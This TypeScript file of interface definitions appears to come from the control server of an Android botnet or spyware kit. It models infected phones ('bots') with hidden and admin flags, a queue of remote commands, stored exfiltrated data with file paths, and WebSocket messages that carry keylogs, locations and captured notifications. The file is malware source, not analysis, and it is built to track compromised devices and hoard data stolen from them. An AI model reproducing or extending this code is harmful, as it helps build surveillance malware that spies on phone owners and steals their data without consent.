export interface BotInfo {
    id: string;
    phoneModel: string;
    androidVersion: string;
    sdkLevel: number;
    country: string;
    ip: string;
    firstSeen: number;
    lastSeen: number;
    isOnline: boolean;
    batteryLevel: number;
    isCharging: boolean;
    isHidden: boolean;
    isAdmin: boolean;
}

export interface StoredCommand {
    id: number;
    botId: string;
    command: string;
    args: string;
    status: 'pending' | 'sent' | 'completed' | 'failed';
    result: string;
    createdAt: number;
    executedAt: number | null;
}

export interface ExfilData {
    id: number;
    botId: string;
    dataType: string;
    content: string;
    filePath: string;
    createdAt: number;
}

export interface WsMessage {
    type: 'register' | 'result' | 'pong' | 'exfil' | 'location' | 'keylog' | 'notification';
    botId: string;
    data?: any;
    cmdId?: number;
    success?: boolean;
    result?: string;
}

export interface CommandPayload {
    id: number;
    command: string;
    args: Record<string, any>;
}
